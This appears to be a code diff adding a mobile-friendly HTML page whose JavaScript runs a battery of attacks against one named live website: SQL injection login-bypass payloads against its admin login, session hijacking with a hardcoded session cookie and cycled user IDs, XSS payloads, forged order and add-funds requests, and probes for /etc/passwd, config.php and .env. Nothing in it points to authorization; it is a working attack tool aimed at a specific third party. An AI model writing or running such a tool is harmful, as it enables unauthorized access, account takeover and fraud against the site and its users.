@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚔️ Comprehensive Attack Test</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .header p {
+            color: #666;
+            font-size: 14px;
+        }
+        .attack-section {
+            margin-bottom: 25px;
+            padding: 20px;
+            border-radius: 15px;
+            background: #f8f9fa;
+            border-left: 4px solid #007bff;
+        }
+        .attack-section h3 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 10px;
+            transition: transform 0.2s;
+        }
+        .btn:hover {
+            transform: translateY(-1px);
+        }
+        .btn:active {
+            transform: translateY(0);
+        }
+        .btn.danger {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+        }
+        .btn.success {
+            background: linear-gradient(135deg, #2ed573 0%, #7bed9f 100%);
+        }
+        .btn.warning {
+            background: linear-gradient(135deg, #ffa502 0%, #ff6348 100%);
+        }
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 12px;
+            display: none;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            line-height: 1.4;
+        }
+        .result.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .result.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .result.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        .progress {
+            width: 100%;
+            height: 6px;
+            background: #e9ecef;
+            border-radius: 3px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .status {
+            text-align: center;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #666;
+        }
+        .quick-actions {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .quick-actions .btn {
+            font-size: 12px;
+            padding: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⚔️ Comprehensive Attack Test</h1>
+            <p>Mobil cihazdan bütün açıqları test et</p>
+        </div>
+
+        <!-- SQL Injection Section -->
+        <div class="attack-section">
+            <h3>🔓 SQL Injection</h3>
+            <button onclick="runSQLInjectionTest()" class="btn danger">SQL Injection Test Et</button>
+            <div class="progress">
+                <div id="sqlProgress" class="progress-bar"></div>
+            </div>
+            <div id="sqlStatus" class="status">Gözləyir...</div>
+        </div>
+
+        <!-- Session Hijacking Section -->
+        <div class="attack-section">
+            <h3>🍪 Session Hijacking</h3>
+            <button onclick="runSessionHijackingTest()" class="btn warning">Session Hijacking Test Et</button>
+            <div class="progress">
+                <div id="sessionProgress" class="progress-bar"></div>
+            </div>
+            <div id="sessionStatus" class="status">Gözləyir...</div>
+        </div>
+
+        <!-- XSS Section -->
+        <div class="attack-section">
+            <h3>🚨 Cross-Site Scripting (XSS)</h3>
+            <button onclick="runXSSTest()" class="btn danger">XSS Test Et</button>
+            <div class="progress">
+                <div id="xssProgress" class="progress-bar"></div>
+            </div>
+            <div id="xssStatus" class="status">Gözləyir...</div>
+        </div>
+
+        <!-- CSRF Section -->
+        <div class="attack-section">
+            <h3>🔄 CSRF (Cross-Site Request Forgery)</h3>
+            <button onclick="runCSRFTest()" class="btn warning">CSRF Test Et</button>
+            <div class="progress">
+                <div id="csrfProgress" class="progress-bar"></div>
+            </div>
+            <div id="csrfStatus" class="status">Gözləyir...</div>
+        </div>
+
+        <!-- Directory Traversal Section -->
+        <div class="attack-section">
+            <h3>📁 Directory Traversal</h3>
+            <button onclick="runDirectoryTraversalTest()" class="btn danger">Directory Traversal Test Et</button>
+            <div class="progress">
+                <div id="dtProgress" class="progress-bar"></div>
+            </div>
+            <div id="dtStatus" class="status">Gözləyir...</div>
+        </div>
+
+        <!-- Quick Actions -->
+        <div class="quick-actions">
+            <button onclick="runAllTests()" class="btn success">🚀 Bütün Testləri İşlə</button>
+            <button onclick="clearResults()" class="btn warning">🗑️ Nəticələri Təmizlə</button>
+        </div>
+
+        <div id="result" class="result"></div>
+    </div>
+
+    <script>
+        // SQL Injection Test
+        async function runSQLInjectionTest() {
+            updateStatus('sqlStatus', 'SQL Injection test edilir...');
+            updateProgress('sqlProgress', 0);
+            
+            const payloads = [
+                "admin' OR 1=1--",
+                "admin' OR '1'='1'--",
+                "admin' OR 1=1#",
+                "admin' OR '1'='1'#",
+                "' OR 1=1--",
+                "' OR '1'='1'--"
+            ];
+            
+            let results = "=== SQL INJECTION TEST ===\n\n";
+            let successCount = 0;
+            
+            for (let i = 0; i < payloads.length; i++) {
+                const payload = payloads[i];
+                updateProgress('sqlProgress', ((i + 1) / payloads.length) * 100);
+                
+                try {
+                    const response = await fetch('https://royzasmm.com.tr/admin/', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
+                        },
+                        body: `username=${encodeURIComponent(payload)}&password=test&remember=1`
+                    });
+
+                    const html = await response.text();
+                    
+                    if (html.includes('username you entered was found')) {
+                        results += `✅ ${payload}: SQL Injection mümkündür!\n`;
+                        successCount++;
+                    } else {
+                        results += `❌ ${payload}: SQL Injection mümkün deyil\n`;
+                    }
+                    
+                } catch (error) {
+                    results += `❌ ${payload}: Xəta - ${error.message}\n`;
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+            
+            results += `\n📊 Nəticə: ${successCount}/${payloads.length} payload uğurlu!`;
+            updateStatus('sqlStatus', 'Tamamlandı!');
+            showResult(results, successCount > 0 ? 'success' : 'error');
+        }
+
+        // Session Hijacking Test
+        async function runSessionHijackingTest() {
+            updateStatus('sessionStatus', 'Session Hijacking test edilir...');
+            updateProgress('sessionProgress', 0);
+            
+            const userIds = [1, 2, 3, 4, 5];
+            const endpoints = ['/dashboard', '/orders', '/account'];
+            
+            let results = "=== SESSION HIJACKING TEST ===\n\n";
+            let successCount = 0;
+            let totalTests = userIds.length * endpoints.length;
+            let currentTest = 0;
+            
+            for (const userId of userIds) {
+                for (const endpoint of endpoints) {
+                    currentTest++;
+                    updateProgress('sessionProgress', (currentTest / totalTests) * 100);
+                    
+                    try {
+                        const response = await fetch('https://royzasmm.com.tr' + endpoint, {
+                            method: 'GET',
+                            headers: {
+                                'Cookie': `PHPSESSID=0dd217dff888e74d1d28eee839336307; u_id=${userId}; u_loginok=1`,
+                                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
+                            }
+                        });
+
+                        if (response.status === 200) {
+                            results += `✅ User ID ${userId} ${endpoint}: Giriş mümkündür!\n`;
+                            successCount++;
+                        } else {
+                            results += `❌ User ID ${userId} ${endpoint}: Giriş qadağandır!\n`;
+                        }
+                        
+                    } catch (error) {
+                        results += `❌ User ID ${userId} ${endpoint}: Xəta - ${error.message}\n`;
+                    }
+                    
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                }
+            }
+            
+            results += `\n📊 Nəticə: ${successCount}/${totalTests} test uğurlu!`;
+            updateStatus('sessionStatus', 'Tamamlandı!');
+            showResult(results, successCount > 0 ? 'success' : 'error');
+        }
+
+        // XSS Test
+        async function runXSSTest() {
+            updateStatus('xssStatus', 'XSS test edilir...');
+            updateProgress('xssProgress', 0);
+            
+            const payloads = [
+                "<script>alert('XSS')</script>",
+                "<img src=x onerror=alert('XSS')>",
+                "javascript:alert('XSS')",
+                "<svg onload=alert('XSS')>"
+            ];
+            
+            let results = "=== XSS TEST ===\n\n";
+            let successCount = 0;
+            
+            for (let i = 0; i < payloads.length; i++) {
+                const payload = payloads[i];
+                updateProgress('xssProgress', ((i + 1) / payloads.length) * 100);
+                
+                try {
+                    const response = await fetch('https://royzasmm.com.tr/search', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
+                        },
+                        body: `q=${encodeURIComponent(payload)}`
+                    });
+
+                    const html = await response.text();
+                    
+                    if (html.includes(payload)) {
+                        results += `✅ ${payload}: XSS mümkündür!\n`;
+                        successCount++;
+                    } else {
+                        results += `❌ ${payload}: XSS mümkün deyil\n`;
+                    }
+                    
+                } catch (error) {
+                    results += `❌ ${payload}: Xəta - ${error.message}\n`;
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+            
+            results += `\n📊 Nəticə: ${successCount}/${payloads.length} XSS payload uğurlu!`;
+            updateStatus('xssStatus', 'Tamamlandı!');
+            showResult(results, successCount > 0 ? 'success' : 'error');
+        }
+
+        // CSRF Test
+        async function runCSRFTest() {
+            updateStatus('csrfStatus', 'CSRF test edilir...');
+            updateProgress('csrfProgress', 0);
+            
+            const endpoints = ['/neworder', '/addfunds', '/account'];
+            const payloads = [
+                'categories=1&services=1&link=test&quantity=100',
+                'amount=1000&payment_method=card',
+                'username=test&email=test@test.com'
+            ];
+            
+            let results = "=== CSRF TEST ===\n\n";
+            let vulnerableCount = 0;
+            
+            for (let i = 0; i < endpoints.length; i++) {
+                const endpoint = endpoints[i];
+                updateProgress('csrfProgress', ((i + 1) / endpoints.length) * 100);
+                
+                try {
+                    const response = await fetch('https://royzasmm.com.tr' + endpoint, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
+                        },
+                        body: payloads[i]
+                    });
+
+                    const html = await response.text();
+                    
+                    if (!html.includes('csrf') && !html.includes('token')) {
+                        results += `❌ ${endpoint}: CSRF qorunması yoxdur!\n`;
+                        vulnerableCount++;
+                    } else {
+                        results += `✅ ${endpoint}: CSRF qorunması var\n`;
+                    }
+                    
+                } catch (error) {
+                    results += `❌ ${endpoint}: Xəta - ${error.message}\n`;
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+            
+            results += `\n📊 Nəticə: ${vulnerableCount}/${endpoints.length} endpoint CSRF-yə qarşı zəif!`;
+            updateStatus('csrfStatus', 'Tamamlandı!');
+            showResult(results, vulnerableCount > 0 ? 'error' : 'success');
+        }
+
+        // Directory Traversal Test
+        async function runDirectoryTraversalTest() {
+            updateStatus('dtStatus', 'Directory Traversal test edilir...');
+            updateProgress('dtProgress', 0);
+            
+            const paths = [
+                '../../../etc/passwd',
+                '../../admin',
+                '../admin',
+                'admin',
+                'admin.php',
+                'config.php',
+                '.env'
+            ];
+            
+            let results = "=== DIRECTORY TRAVERSAL TEST ===\n\n";
+            let accessibleCount = 0;
+            
+            for (let i = 0; i < paths.length; i++) {
+                const path = paths[i];
+                updateProgress('dtProgress', ((i + 1) / paths.length) * 100);
+                
+                try {
+                    const response = await fetch('https://royzasmm.com.tr/' + path, {
+                        method: 'GET',
+                        headers: {
+                            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
+                        }
+                    });
+
+                    if (response.status === 200) {
+                        results += `✅ ${path}: Əlçatandır!\n`;
+                        accessibleCount++;
+                    } else if (response.status === 403) {
+                        results += `⚠️ ${path}: Giriş qadağandır\n`;
+                    } else {
+                        results += `❌ ${path}: Tapılmadı\n`;
+                    }
+                    
+                } catch (error) {
+                    results += `❌ ${path}: Xəta - ${error.message}\n`;
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+            
+            results += `\n📊 Nəticə: ${accessibleCount}/${paths.length} path əlçatandır!`;
+            updateStatus('dtStatus', 'Tamamlandı!');
+            showResult(results, accessibleCount > 0 ? 'error' : 'success');
+        }
+
+        // Run all tests
+        async function runAllTests() {
+            showResult('🚀 Bütün testlər başladılır...\n\nBu proses 5-10 dəqiqə çəkə bilər.', 'info');
+            
+            await runSQLInjectionTest();
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            await runSessionHijackingTest();
+            await new Promise(resolve => setTimeout(resolve), 2000);
+            
+            await runXSSTest();
+            await new Promise(resolve => setTimeout(resolve), 2000);
+            
+            await runCSRFTest();
+            await new Promise(resolve => setTimeout(resolve), 2000);
+            
+            await runDirectoryTraversalTest();
+            
+            showResult('🎉 Bütün testlər tamamlandı!', 'success');
+        }
+
+        // Utility functions
+        function updateProgress(elementId, percentage) {
+            document.getElementById(elementId).style.width = percentage + '%';
+        }
+
+        function updateStatus(elementId, message) {
+            document.getElementById(elementId).textContent = message;
+        }
+
+        function showResult(message, type) {
+            const resultDiv = document.getElementById('result');
+            resultDiv.textContent = message;
+            resultDiv.className = 'result ' + type;
+            resultDiv.style.display = 'block';
+            resultDiv.scrollTop = 0;
+        }
+
+        function clearResults() {
+            document.getElementById('result').style.display = 'none';
+            document.querySelectorAll('.progress-bar').forEach(bar => bar.style.width = '0%');
+            document.querySelectorAll('.status').forEach(status => status.textContent = 'Gözləyir...');
+        }
+
+        // Mobile-specific optimizations
+        if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+            document.body.style.fontSize = '16px';
+            document.querySelectorAll('button').forEach(btn => {
+                btn.style.fontSize = '16px';
+            });
+        }
+    </script>
+</body>
+</html>
